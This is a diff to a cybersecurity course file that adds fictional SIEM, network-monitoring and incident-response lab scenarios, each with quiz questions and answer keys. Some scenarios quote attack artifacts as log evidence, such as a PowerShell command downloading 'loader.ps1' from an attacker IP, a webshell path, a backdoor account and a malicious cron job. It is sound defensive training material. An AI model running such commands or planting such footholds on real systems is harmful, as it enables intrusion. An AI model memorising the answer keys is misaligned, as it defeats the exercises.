@@ -18463,14 +19198,19 @@ Congratulations on completing the SIEM Fundamentals course! 🎉
       "Immediate containment is critical to limit damage"
     ],
     practicalExercise: {
-      title: "Complete Investigation Challenge",
-      description: "Work through the entire investigation scenario using your SIEM skills.",
+      title: "Final Breach Investigation",
+      description: "Investigate the overnight intrusion and pull the key facts from the SIEM data.",
       steps: [
-        "Review the dismissed alerts and identify the pattern",
-        "Build a complete timeline of the attack",
-        "Extract all IOCs for blocking",
-        "Document scope and affected assets",
-        "Write a professional incident report"
+        "Review the dismissed alerts from 02:00-04:00 UTC",
+        "Identify the attacker IP and entry technique",
+        "Map findings to MITRE ATT&CK and answer the lab questions"
+      ],
+      labScenario: "It's 08:00 UTC on October 15, 2024. Overnight, three SIEM alerts between 02:14 and 03:47 UTC were closed as 'false_positive' under the assumption a pentest was running — but the pentest was postponed. Your queries reveal: 412 EventCode=4625 failed logins from external IP 45.77.12.99 against user 'svc_backup' on the VPN, followed by one EventCode=4624 success at 02:51 UTC (LogonType=10). At 03:05 UTC, host SRV-FIN-02 ran a PowerShell command 'Invoke-WebRequest http://45.77.12.99/loader.ps1'. At 03:42 UTC, the firewall logged 1.8 GB outbound from SRV-FIN-02 to 45.77.12.99 over port 443.",
+      labQuestions: [
+        { id: "siem-7.4-q1", question: "What is the attacker's source IP?", answer: "45.77.12.99", hint: "The same IP appears in failed logins, PowerShell, and exfil." },
+        { id: "siem-7.4-q2", question: "Which account was successfully compromised and at what time?", answer: "svc_backup at 02:51 UTC", hint: "The first 4624 success after the 4625 burst." },
+        { id: "siem-7.4-q3", question: "Which host was used for execution and exfiltration?", answer: "SRV-FIN-02", hint: "Same host runs PowerShell and sends the outbound traffic." },
+        { id: "siem-7.4-q4", question: "How much data was exfiltrated and over what port?", answer: "1.8 GB over port 443", hint: "Check the firewall outbound entry at 03:42 UTC." }
       ]
     }
   },
@@ -18544,13 +19284,39 @@ Without NSM, the organization might only discover the breach weeks later during 
       "Collection, detection, and analysis form the three pillars of NSM"
     ],
     practicalExercise: {
-      title: "Map Your NSM Data Sources",
-      description: "Identify the NSM data sources available in a typical enterprise environment.",
+      title: "NSM Data Source Triage",
+      description: "Use the NSM data types to investigate a suspected intrusion.",
       steps: [
-        "List all network segments in a hypothetical corporate environment (DMZ, internal, guest)",
-        "For each segment, identify what NSM data types could be collected",
-        "Determine optimal sensor placement for each segment",
-        "Document which tools would generate each data type (Zeek for session, Suricata for alerts, tcpdump for PCAP)"
+        "Read the scenario carefully",
+        "Match each finding to the correct NSM data type",
+        "Answer the questions using only the scenario details"
+      ],
+      labScenario: "Your NSM platform alerts on workstation WKS-MKT-09 at 02:14 UTC. Suricata fires an alert tagged 'ET MALWARE Possible C2 Beacon'. Zeek session data shows WKS-MKT-09 connecting to 185.220.101.45 on port 443 every 60 seconds for the last 4 hours, each session transferring exactly 1.2 KB. A full packet capture stored on the sensor preserves every byte of those sessions. Endpoint EDR has not generated any alert for this host yet.",
+      labQuestions: [
+        {
+          id: "1.1-q1",
+          question: "Which Suricata alert tag fired for WKS-MKT-09?",
+          answer: "ET MALWARE Possible C2 Beacon",
+          hint: "Look at the Suricata alert text in the scenario."
+        },
+        {
+          id: "1.1-q2",
+          question: "What is the beacon interval observed in Zeek session data?",
+          answer: "60 seconds",
+          hint: "The scenario states how often the connection repeats."
+        },
+        {
+          id: "1.1-q3",
+          question: "Which external IP is WKS-MKT-09 communicating with?",
+          answer: "185.220.101.45",
+          hint: "The destination IP is given in the Zeek session details."
+        },
+        {
+          id: "1.1-q4",
+          question: "Which NSM data type would let you reconstruct the exact bytes sent in each beacon?",
+          answer: "full packet capture",
+          hint: "The scenario mentions data 'preserves every byte'."
+        }
       ]
     },
     additionalResources: [
@@ -18665,12 +19431,38 @@ ICMP carries diagnostic messages but is frequently weaponized:
     ],
     practicalExercise: {
       title: "Protocol Anomaly Identification",
-      description: "Analyze sample traffic logs and identify protocol violations.",
+      description: "Use protocol knowledge to spot suspicious behavior in captured traffic.",
       steps: [
-        "Open a sample PCAP in Wireshark and filter for TCP conversations",
-        "Identify any abnormal TCP flag combinations (SYN+FIN, NULL, XMAS)",
-        "Filter for DNS traffic and look for high-entropy domain names or TXT queries",
-        "Examine HTTP traffic for suspicious User-Agent strings or non-standard methods"
+        "Review the captured traffic in the scenario",
+        "Match each finding to the protocol it abuses",
+        "Answer based only on what the scenario shows"
+      ],
+      labScenario: "An NSM analyst reviews a 10-minute capture from the data-center sensor. They observe: (1) host 10.10.5.22 sending TCP packets to 198.51.100.7 with both the SYN and FIN flags set; (2) repeated DNS TXT record queries to 'a8f3c.update.badc2.net' returning 480-byte responses; (3) outbound HTTP requests to evil-cdn.io using the User-Agent string 'curl/7.68.0' from a workstation that normally runs only Chrome; (4) SNMP traffic on UDP port 161 carrying the community string 'public' in cleartext.",
+      labQuestions: [
+        {
+          id: "1.2-q1",
+          question: "Which abnormal TCP flag combination did host 10.10.5.22 send?",
+          answer: "SYN+FIN",
+          hint: "Two flags should never appear together in a normal handshake."
+        },
+        {
+          id: "1.2-q2",
+          question: "Which DNS record type is being abused for likely tunneling?",
+          answer: "TXT",
+          hint: "The scenario names the record type used for large 480-byte responses."
+        },
+        {
+          id: "1.2-q3",
+          question: "Which suspicious User-Agent string was seen on a Chrome-only workstation?",
+          answer: "curl/7.68.0",
+          hint: "Look at the HTTP request details."
+        },
+        {
+          id: "1.2-q4",
+          question: "Which UDP port carried the cleartext SNMP community string?",
+          answer: "161",
+          hint: "The scenario lists the SNMP port directly."
+        }
       ]
     }
   },
@@ -18962,14 +19754,39 @@ Analyze → Expert Information highlights protocol violations, retransmissions, 
       "tshark provides command-line analysis for large-scale PCAP processing"
     ],
     practicalExercise: {
-      title: "Wireshark Filter Mastery",
-      description: "Practice writing filters to isolate specific traffic patterns.",
+      title: "Wireshark Triage Walkthrough",
+      description: "Use Wireshark filters and statistics to triage a suspicious capture.",
       steps: [
-        "Download a sample PCAP from malware-traffic-analysis.net",
-        "Use display filters to isolate all DNS queries",
-        "Follow a TCP stream to reconstruct an HTTP session",
-        "Use Statistics → Conversations to find the top talkers",
-        "Check Expert Information for any protocol anomalies"
+        "Read the Wireshark findings in the scenario",
+        "Translate each finding into the right filter or menu option",
+        "Answer the questions using only the values shown"
+      ],
+      labScenario: "You open the file 'incident-2026-04-30.pcapng' in Wireshark. The capture covers 30 minutes from sensor SPAN-DC-01. You apply the display filter 'dns' and see 4,812 DNS queries from a single host, 10.20.4.18, all going to the resolver 8.8.8.8. Statistics → Conversations shows 10.20.4.18 is the top talker with 612 MB of HTTP traffic. You right-click an HTTP packet and choose 'Follow → TCP Stream' to reconstruct a session that uploads a file named 'payroll_2026.zip' to the host upload.evilshare.io. Expert Information flags 47 TCP retransmissions on that same conversation.",
+      labQuestions: [
+        {
+          id: "2.1-q1",
+          question: "Which display filter did you apply to isolate the 4,812 DNS queries?",
+          answer: "dns",
+          hint: "The scenario states the exact filter used."
+        },
+        {
+          id: "2.1-q2",
+          question: "Which internal host is the top talker in the capture?",
+          answer: "10.20.4.18",
+          hint: "Statistics → Conversations identifies it."
+        },
+        {
+          id: "2.1-q3",
+          question: "Which Wireshark feature was used to reconstruct the upload session?",
+          answer: "Follow TCP Stream",
+          hint: "The scenario mentions a right-click menu option."
+        },
+        {
+          id: "2.1-q4",
+          question: "What filename was uploaded to upload.evilshare.io?",
+          answer: "payroll_2026.zip",
+          hint: "The reconstructed stream shows the file name."
+        }
       ]
     }
   },
@@ -19191,12 +20008,38 @@ Key fields to analyze:
     ],
     practicalExercise: {
       title: "DNS Threat Detection Lab",
-      description: "Analyze DNS logs to identify tunneling and DGA activity.",
+      description: "Investigate suspicious DNS activity captured by Zeek.",
       steps: [
-        "Calculate the entropy of subdomain strings in a DNS log sample",
-        "Identify domains with unusually high query volumes (>100/hour)",
-        "Find TXT record queries and evaluate their response sizes",
-        "Look for NXDomain clustering that may indicate DGA activity"
+        "Read the Zeek dns.log findings carefully",
+        "Identify which patterns indicate tunneling vs DGA",
+        "Answer using only the values shown in the scenario"
+      ],
+      labScenario: "Zeek dns.log entries from sensor SENS-EAST show host 10.30.7.42 generating DNS activity over the last hour: 1,840 queries to subdomains of 'tun.exfilzone.com', each subdomain 60+ characters of random base32 (e.g. 'k7m2p9q3r1s8t4u6v0w5x2y9z1a3b7c4.tun.exfilzone.com'), all returning TXT records of 240 bytes. In parallel, the same host issues 612 queries to randomly-generated 12-character domains under .top, of which 598 return NXDOMAIN. The internal DNS resolver baseline for this host is normally under 200 queries per hour.",
+      labQuestions: [
+        {
+          id: "2.3-q1",
+          question: "Which parent domain is being used for likely DNS tunneling?",
+          answer: "tun.exfilzone.com",
+          hint: "Look at the suffix shared by the long random subdomains."
+        },
+        {
+          id: "2.3-q2",
+          question: "Which DNS record type is carrying the 240-byte responses?",
+          answer: "TXT",
+          hint: "The scenario names the record type for the large responses."
+        },
+        {
+          id: "2.3-q3",
+          question: "How many of the 612 .top queries returned NXDOMAIN, indicating DGA?",
+          answer: "598",
+          hint: "The NXDOMAIN count is given directly."
+        },
+        {
+          id: "2.3-q4",
+          question: "Which internal host is generating all of this suspicious DNS activity?",
+          answer: "10.30.7.42",
+          hint: "The source IP appears at the start of the scenario."
+        }
       ]
     }
   },
@@ -19436,13 +20279,38 @@ Document all Indicators of Compromise (IOCs):
     ],
     practicalExercise: {
       title: "Full PCAP Investigation",
-      description: "Analyze a sample PCAP from start to finish using the methodology above.",
+      description: "Walk through a complete PCAP investigation from initial alert to summary.",
       steps: [
-        "Download a challenge PCAP from malware-traffic-analysis.net",
-        "Run the initial statistics commands to get a capture overview",
-        "Investigate DNS queries for suspicious domains",
-        "Examine HTTP objects for malicious files",
-        "Build a complete timeline and write an incident summary"
+        "Read each artifact found in the PCAP",
+        "Identify the delivery, payload, C2 and exfil stages",
+        "Answer the questions using only details from the scenario"
+      ],
+      labScenario: "You analyze the file 'incident-042.pcap' (size 184 MB, 412,330 packets, capture window 09:12-09:47 UTC). Initial statistics show host 10.50.1.27 is the top internal talker. DNS queries reveal the host resolved 'cdn-update-microsoft.support' to 91.243.59.10. An HTTP GET request downloaded 'invoice.doc' (212 KB, MD5 a1b2c3d4e5f60718293a4b5c6d7e8f90) from that server. Two minutes later, 10.50.1.27 began HTTPS sessions to 91.243.59.10:443 every 30 seconds, each 1.4 KB. At 09:41 UTC, a single 64 MB upload to the same host completed in 90 seconds.",
+      labQuestions: [
+        {
+          id: "2.5-q1",
+          question: "Which suspicious domain did host 10.50.1.27 resolve at the start of the incident?",
+          answer: "cdn-update-microsoft.support",
+          hint: "Look at the DNS query in the scenario."
+        },
+        {
+          id: "2.5-q2",
+          question: "What is the filename of the malicious document downloaded over HTTP?",
+          answer: "invoice.doc",
+          hint: "The HTTP GET object name is shown."
+        },
+        {
+          id: "2.5-q3",
+          question: "What is the MD5 hash of the downloaded document?",
+          answer: "a1b2c3d4e5f60718293a4b5c6d7e8f90",
+          hint: "The hash is given alongside the file size."
+        },
+        {
+          id: "2.5-q4",
+          question: "How large was the exfiltration upload that completed at 09:41 UTC?",
+          answer: "64 MB",
+          hint: "The scenario states the upload size."
+        }
       ]
     }
   },
@@ -19744,13 +20612,38 @@ alert tcp $EXTERNAL_NET any -> $HOME_NET any (
     ],
     practicalExercise: {
       title: "Write Custom Detection Rules",
-      description: "Create Suricata rules for specific threat scenarios.",
+      description: "Build a Suricata rule from a real threat brief.",
       steps: [
-        "Write a rule to detect HTTP POST requests to '/gate.php' or '/panel.php'",
-        "Create a DNS detection rule for queries containing '.onion.' in the domain",
-        "Write a TLS rule using JA3 fingerprinting for a known malware family",
-        "Add threshold logic to a port scan detection rule",
-        "Test your rules against a sample PCAP using suricata -r"
+        "Read the threat intel brief in the scenario",
+        "Identify the protocol, port, content match and SID",
+        "Answer the questions using only the brief"
+      ],
+      labScenario: "Threat intel reports a new commodity stealer named 'NightOwl'. Analysts confirm: every infected host sends an HTTP POST request from any source port to TCP port 80, targeting the URI '/gate.php' on attacker-controlled web servers. The HTTP body always contains the static string 'owl_id=' followed by the victim ID. Your team agrees to deploy a Suricata alert with the message 'NightOwl Stealer C2 Check-in' and assign SID 2026041 in the local rule file local.rules. The rule should fire on traffic from $HOME_NET to $EXTERNAL_NET.",
+      labQuestions: [
+        {
+          id: "3.2-q1",
+          question: "Which HTTP method should the Suricata rule match for NightOwl C2?",
+          answer: "POST",
+          hint: "The brief specifies the HTTP method."
+        },
+        {
+          id: "3.2-q2",
+          question: "Which URI path is targeted by the malware check-in?",
+          answer: "/gate.php",
+          hint: "The brief gives the exact URI path."
+        },
+        {
+          id: "3.2-q3",
+          question: "Which static content string appears in every POST body?",
+          answer: "owl_id=",
+          hint: "Look at the body content described in the brief."
+        },
+        {
+          id: "3.2-q4",
+          question: "Which SID should be assigned to the new rule?",
+          answer: "2026041",
+          hint: "The team agreed on a specific SID number."
+        }
       ]
     }
   },
@@ -19878,6 +20771,43 @@ filebeat.inputs:
       "Threshold types (limit, threshold, both) control alert frequency",
       "A structured triage workflow prevents alert fatigue"
     ],
+    practicalExercise: {
+      title: "Tune a Noisy Suricata Rule",
+      description: "Reduce alert fatigue by analyzing a noisy rule and applying suppression.",
+      steps: [
+        "Read the alert volume in the scenario",
+        "Identify the source of the false positives",
+        "Decide the right tuning action",
+        "Answer the questions"
+      ],
+      labScenario: "Your Suricata sensor generated 4,820 alerts in the last 24 hours from rule SID 2013030 'ET POLICY curl User-Agent Outbound'. Investigation shows 4,710 of those alerts came from internal monitoring host 10.20.5.12 hitting api.internal.corp every 60 seconds for health checks. The remaining 110 alerts are from various workstations and require review.",
+      labQuestions: [
+        {
+          id: "3.3-q1",
+          question: "Which Suricata SID is generating the noise?",
+          answer: "2013030",
+          hint: "Listed at the start of the scenario."
+        },
+        {
+          id: "3.3-q2",
+          question: "Which internal source IP accounts for the false positives?",
+          answer: "10.20.5.12",
+          hint: "The monitoring host named in the scenario."
+        },
+        {
+          id: "3.3-q3",
+          question: "Which destination host is the monitoring traffic targeting?",
+          answer: "api.internal.corp",
+          hint: "Stated in the health check description."
+        },
+        {
+          id: "3.3-q4",
+          question: "How many alerts remain for analyst review after suppressing the monitoring host?",
+          answer: "110",
+          hint: "Total minus the false positives."
+        }
+      ]
+    }
   },
   {
     id: "3.4",
@@ -20349,6 +21279,49 @@ Document each hunt with:
       "Data exfiltration detection uses volume asymmetry and protocol tunneling indicators",
       "Documenting hunts as playbooks ensures repeatable, systematic hunting"
     ],
+    practicalExercise: {
+      title: "Hunt a Beacon in Zeek Logs",
+      description: "Use Zeek conn.log patterns to identify a C2 beacon.",
+      steps: [
+        "Review the beaconing pattern in the scenario",
+        "Identify the suspicious host and destination",
+        "Calculate the beacon interval",
+        "Answer the questions"
+      ],
+      labScenario: "While hunting in conn.log, you find host 192.168.10.45 making 1,440 connections in 24 hours to external IP 185.220.101.7 on port 443. Each connection lasts ~2 seconds and transfers exactly 512 bytes outbound and 128 bytes inbound. The connections occur every 60 seconds with negligible jitter. SSL log shows a self-signed certificate with CN 'cloudsync.io'.",
+      labQuestions: [
+        {
+          id: "4.3-q1",
+          question: "Which internal host is exhibiting beaconing behavior?",
+          answer: "192.168.10.45",
+          hint: "The source IP in the scenario."
+        },
+        {
+          id: "4.3-q2",
+          question: "What is the destination IP of the suspected C2 server?",
+          answer: "185.220.101.7",
+          hint: "External IP listed in the conn.log finding."
+        },
+        {
+          id: "4.3-q3",
+          question: "What is the beacon interval in seconds?",
+          answer: "60",
+          hint: "Stated as the connection frequency."
+        },
+        {
+          id: "4.3-q4",
+          question: "What CN is presented in the self-signed SSL certificate?",
+          answer: "cloudsync.io",
+          hint: "Listed in the SSL log."
+        },
+        {
+          id: "4.3-q5",
+          question: "Which destination port is the beacon using?",
+          answer: "443",
+          hint: "Standard HTTPS port stated in the scenario."
+        }
+      ]
+    }
   },
   {
     id: "4.4",
@@ -20714,6 +21687,49 @@ Attackers choose protocols likely to pass through firewalls:
       "DNS-based C2 uses high query volumes and encoded subdomain labels",
       "Multi-layered detection (JA3 + timing + certificates) reduces evasion success"
     ],
+    practicalExercise: {
+      title: "Investigate DNS-Based C2",
+      description: "Detect data exfiltration over DNS by analyzing query patterns.",
+      steps: [
+        "Read the DNS log summary in the scenario",
+        "Identify the suspicious domain and host",
+        "Decide which indicator confirms tunneling",
+        "Answer the questions"
+      ],
+      labScenario: "Your Zeek dns.log shows host 10.50.2.18 making 2,340 DNS queries to subdomains of 'updates-cdn.click' in the last hour. Each query name is 58 characters long and looks like 'a7f9k2m8.b3xq.updates-cdn.click'. Response type is TXT with 220-byte payloads. No other internal host queries this domain. The corporate DNS resolver did not block it because the domain is only 6 hours old.",
+      labQuestions: [
+        {
+          id: "5.2-q1",
+          question: "Which internal host is performing the suspicious DNS activity?",
+          answer: "10.50.2.18",
+          hint: "Source IP in the dns.log."
+        },
+        {
+          id: "5.2-q2",
+          question: "What is the parent domain being abused for tunneling?",
+          answer: "updates-cdn.click",
+          hint: "Named in the scenario."
+        },
+        {
+          id: "5.2-q3",
+          question: "How many DNS queries did the host make in the last hour?",
+          answer: "2340",
+          hint: "Total query count."
+        },
+        {
+          id: "5.2-q4",
+          question: "Which DNS record type is being used to carry the payload?",
+          answer: "TXT",
+          hint: "Listed as the response type."
+        },
+        {
+          id: "5.2-q5",
+          question: "How old (in hours) is the abused domain?",
+          answer: "6",
+          hint: "Stated at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "5.3",
@@ -20935,6 +21951,55 @@ Network-based DLP can inspect content for:
       "DNS exfiltration encodes data in subdomain labels and is detectable through query analysis",
       "Cloud storage exfiltration is harder to detect but SSL SNI reveals destinations"
     ],
+    practicalExercise: {
+      title: "Spot Off-Hours Data Exfiltration",
+      description: "Identify a large outbound transfer hidden in off-hours traffic.",
+      steps: [
+        "Review the conn.log summary",
+        "Identify the host and destination involved",
+        "Confirm the volume asymmetry",
+        "Answer the questions"
+      ],
+      labScenario: "Reviewing yesterday's conn.log you find host 172.16.4.88 (workstation belonging to user 'r.patel') established a single SSL connection to 198.51.100.205 at 02:47 UTC lasting 38 minutes. The connection uploaded 4.2 GB and downloaded only 18 MB. SSL SNI shows 'mega.nz'. The user's normal working hours are 09:00-18:00 IST, and there is no business justification on file for using mega.nz.",
+      labQuestions: [
+        {
+          id: "5.4-q1",
+          question: "Which internal host performed the transfer?",
+          answer: "172.16.4.88",
+          hint: "Source IP in conn.log."
+        },
+        {
+          id: "5.4-q2",
+          question: "Which user owns that workstation?",
+          answer: "r.patel",
+          hint: "Stated next to the host."
+        },
+        {
+          id: "5.4-q3",
+          question: "What external destination IP received the data?",
+          answer: "198.51.100.205",
+          hint: "Listed in the connection record."
+        },
+        {
+          id: "5.4-q4",
+          question: "What SNI value reveals the cloud storage service used?",
+          answer: "mega.nz",
+          hint: "From the SSL log."
+        },
+        {
+          id: "5.4-q5",
+          question: "How much data was uploaded during the session?",
+          answer: "4.2 GB",
+          hint: "The asymmetric upload volume."
+        },
+        {
+          id: "5.4-q6",
+          question: "At what UTC time did the connection start?",
+          answer: "02:47",
+          hint: "Off-hours timestamp."
+        }
+      ]
+    }
   },
 
   // Module 6: Practical NSM Operations
@@ -21190,6 +22255,55 @@ tshark -r evidence.pcap -Y "dns && ip.src==10.0.1.50" \\
       "File extraction from PCAPs preserves malware samples and stolen documents",
       "Forensic reports must reference specific evidence for every claim"
     ],
+    practicalExercise: {
+      title: "Reconstruct an Intrusion Timeline",
+      description: "Build a chronological timeline from PCAP and Zeek evidence.",
+      steps: [
+        "Read each evidence item in the scenario",
+        "Order events by timestamp",
+        "Identify the IOCs",
+        "Answer the questions"
+      ],
+      labScenario: "You are reviewing evidence from compromised host 10.10.7.22. Zeek http.log shows a download of 'invoice.doc' (SHA256: a91f...c4) from 91.219.236.18 at 13:02 UTC. At 13:04 UTC conn.log records a new outbound HTTPS session from 10.10.7.22 to 45.77.65.211:8443. At 13:11 UTC dns.log shows queries for 'auth.payroll-helpdesk.net'. At 14:30 UTC files.log records a 1.8 GB upload to the same destination. The PCAP was hashed (MD5: 7e3b...91) and stored in evidence locker E-2049.",
+      labQuestions: [
+        {
+          id: "6.2-q1",
+          question: "Which host is the subject of the investigation?",
+          answer: "10.10.7.22",
+          hint: "Compromised host named in the scenario."
+        },
+        {
+          id: "6.2-q2",
+          question: "What was the name of the malicious document downloaded?",
+          answer: "invoice.doc",
+          hint: "Listed in http.log."
+        },
+        {
+          id: "6.2-q3",
+          question: "What IP delivered the malicious document?",
+          answer: "91.219.236.18",
+          hint: "Source of the download in http.log."
+        },
+        {
+          id: "6.2-q4",
+          question: "What C2 IP and port did the host beacon to?",
+          answer: "45.77.65.211:8443",
+          hint: "From conn.log at 13:04 UTC."
+        },
+        {
+          id: "6.2-q5",
+          question: "Which domain was queried after initial compromise?",
+          answer: "auth.payroll-helpdesk.net",
+          hint: "From dns.log at 13:11 UTC."
+        },
+        {
+          id: "6.2-q6",
+          question: "What is the evidence locker ID for the PCAP?",
+          answer: "E-2049",
+          hint: "Stated at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "6.3",
@@ -21530,14 +22644,20 @@ Incident response doesn't exist in isolation. It integrates with:
       "Incident response integrates with SOC, forensics, threat intelligence, and compliance functions"
     ],
     practicalExercise: {
-      title: "Incident Classification Exercise",
-      description: "Practice classifying security events into the correct incident categories.",
+      title: "Event vs. Incident Triage",
+      description: "Classify a series of observations from the SOC queue and identify the true security incident.",
       steps: [
-        "Review a list of 10 sample security events (failed logins, malware alerts, data access logs)",
-        "Classify each as Event, Adverse Event, or Security Incident",
-        "For each incident, assign a category (malware, unauthorized access, data breach, etc.)",
-        "Justify your classification with specific indicators",
-        "Compare your results with the answer key and identify any misclassifications"
+        "Read the morning shift handover scenario",
+        "Distinguish events, adverse events, and incidents",
+        "Identify the correct incident category",
+        "Answer the lab questions using details from the scenario"
+      ],
+      labScenario: "It's 08:00 on Monday at Acme Corp. The overnight SOC queue shows four items: (1) user 'jdoe' logged into the VPN from Mumbai at 02:14 UTC, (2) the perimeter firewall blocked 1,200 inbound SYN packets to port 3389, (3) endpoint EP-FIN-07 triggered a Defender alert for 'Ransom:Win32/Conti' and the file server FS-PROD-01 now shows 4,300 files renamed with a .conti extension, and (4) a printer rebooted itself at 03:00. Your lead asks you to triage the queue before standup.",
+      labQuestions: [
+        { id: "ir-1.1-q1", question: "Which item is a confirmed Security Incident?", answer: "Item 3 (Conti ransomware on EP-FIN-07)", hint: "Look for a violation of security policy with clear impact." },
+        { id: "ir-1.1-q2", question: "Which incident category does item 3 fall under?", answer: "Malware Infection (Ransomware)", hint: "Check the categories listed in the lesson." },
+        { id: "ir-1.1-q3", question: "Which item is best classified as an Event (not adverse, not an incident)?", answer: "Item 1 (jdoe VPN login)", hint: "A normal observable occurrence with no negative consequence." },
+        { id: "ir-1.1-q4", question: "Which file server is impacted and how many files were affected?", answer: "FS-PROD-01, 4,300 files", hint: "Re-read the ransomware detail in the scenario." }
       ]
     }
   },
@@ -22104,6 +23224,43 @@ Alert Received → Validate → Classify → Prioritize → Assign → Investiga
       "SEV-1 incidents require 15-minute initial response and continuous updates",
       "Alert fatigue and anchoring bias are common triage pitfalls"
     ],
+    practicalExercise: {
+      title: "Morning Triage Queue",
+      description: "Triage four overnight alerts and decide what gets escalated first.",
+      steps: [
+        "Read the scenario",
+        "Compare each alert against the severity matrix",
+        "Decide which one is SEV-1",
+        "Answer the questions"
+      ],
+      labScenario: "At 09:00 you open the queue and see four overnight alerts. Alert A: failed login spike against the marketing intern's account, no success. Alert B: EDR flagged ransomware encryption activity on file server FS-PROD-02, still running. Alert C: a developer ran nmap from their laptop against a test subnet. Alert D: an outbound DNS request to a known C2 domain from the CFO's workstation, single hit 30 minutes ago.",
+      labQuestions: [
+        {
+          id: "ir-3.2-q1",
+          question: "Which alert letter is SEV-1?",
+          answer: "B",
+          hint: "Active encryption on a production server."
+        },
+        {
+          id: "ir-3.2-q2",
+          question: "Which server is being encrypted?",
+          answer: "FS-PROD-02",
+          hint: "Named in alert B."
+        },
+        {
+          id: "ir-3.2-q3",
+          question: "Which alert is most likely a false positive from authorized activity?",
+          answer: "C",
+          hint: "Internal employee testing."
+        },
+        {
+          id: "ir-3.2-q4",
+          question: "Whose workstation contacted the C2 domain?",
+          answer: "CFO",
+          hint: "Named in alert D."
+        }
+      ]
+    }
   },
   {
     id: "3.3",
@@ -22297,6 +23454,43 @@ Short-term containment focuses on **immediately stopping the attacker's ability 
       "Never power off a compromised system before capturing volatile memory",
       "EDR isolation is preferred over physical disconnection as it maintains management access"
     ],
+    practicalExercise: {
+      title: "Containing an Active Beacon",
+      description: "Decide the right short-term containment actions for an active C2 beacon.",
+      steps: [
+        "Read the scenario carefully",
+        "Identify the affected host and attacker IP",
+        "Choose containment that preserves evidence",
+        "Answer the questions"
+      ],
+      labScenario: "Your EDR shows host WKS-HR-14 beaconing every 60 seconds to attacker IP 203.0.113.45 over HTTPS. The user is on PTO and the laptop is in the office, plugged in. Memory has not been captured yet. The CISO wants the beacon stopped within 10 minutes but also wants forensic evidence preserved.",
+      labQuestions: [
+        {
+          id: "ir-4.1-q1",
+          question: "Which host needs to be contained?",
+          answer: "WKS-HR-14",
+          hint: "Named in the scenario."
+        },
+        {
+          id: "ir-4.1-q2",
+          question: "Which attacker IP should be blocked at the firewall?",
+          answer: "203.0.113.45",
+          hint: "The destination of the beacon."
+        },
+        {
+          id: "ir-4.1-q3",
+          question: "What containment action preserves evidence and stops the beacon? (one word)",
+          answer: "EDR isolation",
+          hint: "Network-isolates the host but keeps management access."
+        },
+        {
+          id: "ir-4.1-q4",
+          question: "What must you capture before any action that could disrupt running processes?",
+          answer: "memory",
+          hint: "Volatile data lost on shutdown."
+        }
+      ]
+    }
   },
   {
     id: "4.2",
@@ -22543,6 +23737,43 @@ Before removal, you must find every way the attacker can return:
       "When in doubt, rebuild from clean media rather than attempting to clean a compromised system",
       "KRBTGT reset is required whenever Active Directory domain compromise is confirmed"
     ],
+    practicalExercise: {
+      title: "Eradicating a Persistent Foothold",
+      description: "Identify what must be removed to fully evict the attacker.",
+      steps: [
+        "Read the scenario",
+        "List each persistence mechanism mentioned",
+        "Decide between cleaning and rebuilding",
+        "Answer the questions"
+      ],
+      labScenario: "On compromised web server WEB-DMZ-01 you found a webshell at /var/www/html/help.php, a new local account named svc_update, an SSH key added to /root/.ssh/authorized_keys, and a cron job running every 10 minutes calling /tmp/.x. The attacker also dumped LSASS on a Windows DC and pass-the-hash was observed. Initial access was an unpatched Log4j vulnerability.",
+      labQuestions: [
+        {
+          id: "ir-5.1-q1",
+          question: "What is the filename of the webshell?",
+          answer: "help.php",
+          hint: "Found under /var/www/html/."
+        },
+        {
+          id: "ir-5.1-q2",
+          question: "What is the name of the backdoor account?",
+          answer: "svc_update",
+          hint: "Listed in the scenario."
+        },
+        {
+          id: "ir-5.1-q3",
+          question: "Which AD account must be reset twice because the DC was compromised?",
+          answer: "KRBTGT",
+          hint: "Required after domain compromise."
+        },
+        {
+          id: "ir-5.1-q4",
+          question: "Which vulnerability provided initial access?",
+          answer: "Log4j",
+          hint: "Stated at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "5.2",
@@ -22857,6 +24088,43 @@ The incident report is the permanent record of what happened, what was done, and
       "Separate observed facts from analytical conclusions",
       "Recommendations should be categorized by timeframe: immediate, short-term, and long-term"
     ],
+    practicalExercise: {
+      title: "Drafting the Incident Report",
+      description: "Pull the right facts from the case notes into the report sections.",
+      steps: [
+        "Read the scenario",
+        "Match each fact to the correct report section",
+        "Keep numbers and times precise",
+        "Answer the questions"
+      ],
+      labScenario: "Incident INC-2026-041 was declared SEV-2. A phishing email was delivered at 2026-04-22 08:32 UTC, the user clicked at 08:45 UTC, a Cobalt Strike beacon started at 08:46 UTC, and containment completed at 11:15 UTC. 3 servers and 12 user accounts were affected. No regulated data was exposed. The root cause was a missing email attachment sandbox.",
+      labQuestions: [
+        {
+          id: "ir-6.2-q1",
+          question: "What incident ID is being reported?",
+          answer: "INC-2026-041",
+          hint: "Top of the scenario."
+        },
+        {
+          id: "ir-6.2-q2",
+          question: "What severity was assigned?",
+          answer: "SEV-2",
+          hint: "Stated in the first sentence."
+        },
+        {
+          id: "ir-6.2-q3",
+          question: "How many servers were affected?",
+          answer: "3",
+          hint: "Be precise — number, not 'several'."
+        },
+        {
+          id: "ir-6.2-q4",
+          question: "What was the root cause?",
+          answer: "missing email attachment sandbox",
+          hint: "Stated at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "6.3",
